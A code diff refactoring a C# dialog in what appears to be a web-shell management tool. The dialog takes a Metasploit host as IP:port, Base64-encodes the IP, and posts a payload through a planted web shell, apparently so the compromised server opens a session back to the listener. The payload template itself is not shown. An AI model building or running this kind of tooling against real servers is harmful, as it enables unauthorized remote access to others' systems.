@@ -1,7 +1,6 @@
 ﻿using C2.Controls;
 using C2.Core;
 using C2.Utils;
-using System.Collections.Generic;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
@@ -9,54 +8,52 @@ namespace C2.Business.CastleBravo.WebShellTool
 {
     partial class MSFSet : StandardDialog
     {
-        private string MSF { get => msfTextBox.Text.Trim(); set => msfTextBox.Text = value; }
+        protected string RemoteHost { get => rhTextBox.Text.Trim(); set => rhTextBox.Text = value; }
         private readonly WebShellTaskConfig task;
-        private ProxySetting proxy;
-        private InfoType infoType;
-        public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy,FormViewSet viewSet)
+        private readonly ProxySetting proxy;
+        protected string payload;
+
+        public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
         {
             InitializeComponent();
-            task = taskConfig;
+            
+            this.task = taskConfig;
             this.proxy = proxy;
-            MSF = Global.MSFHost;
-            UpdateFormView(viewSet);
 
-
+            this.payload = Global.MSFPayload;
+            this.RemoteHost = Global.MSFHost;
         }
-        private void UpdateFormView(FormViewSet viewSet)
-        {
-            if (viewSet == null)
-                return;
-            this.Text = viewSet.Title;
-            this.addr.Text = viewSet.SubTitle;
-            this.help1.Text = viewSet.TipInfo;
-            this.infoType = viewSet.InfoType;
 
-        }
         protected override bool OnOKButtonClick()
         {
-            string addr = this.addr.Text.Trim(':');
-            if (MSF.IsNullOrEmpty())
+            
+            if (RemoteHost.IsNullOrEmpty())
             {
-                HelpUtil.ShowMessageBox(string.Format("【{0}】不能为空。", addr));
+                HelpUtil.ShowMessageBox("地址不能为空。");
                 return false;
             }
             string RegexStr = @"((\d{1,3}\.){3}\d{1,3}):(\d{3,5})";
-            Match mc = Regex.Match(MSF.Trim(), RegexStr);
+            Match mc = Regex.Match(RemoteHost.Trim(), RegexStr);
             
             if (mc.Groups.Count < 3)
             {
-                HelpUtil.ShowMessageBox(string.Format("【{0}】格式有误。", addr));
+                HelpUtil.ShowMessageBox("格式有误, 不符合【IP:端口】的形式");
                 return false;
             }
-            Global.MSFHost = MSF;
             string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
             string port = mc.Groups[3].Value;
-            string payload = string.Format(Global.InfoPayloadDict[this.infoType], task.Password, port, encodeIP);
-            Task<string> t = Task.Run(() => PostPayload(payload));
+
+            SetRemoteHost();
+
+            Task.Run(() => PostPayload(string.Format(payload, task.Password, port, encodeIP)));
             return base.OnOKButtonClick();
         }
-        
+
+        protected virtual void SetRemoteHost()
+        {
+            Global.MSFHost = RemoteHost.Trim();
+        }
+            
         private string PostPayload(string payload)
         {
             try 
@@ -66,17 +63,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             catch
             {
                 return string.Empty;
-            }
-            
+            }   
         }
     }
-    internal class FormViewSet
-    {
-        public string Title { get; set; } = "MSF配置";
-        public string SubTitle { get; set; } = "MSF地址:";
-        public string TipInfo { get; set; } = "输入MSF地址,例如:";
-        public InfoType InfoType { get; set; } = InfoType.MSF;
-
-    }
-
 }
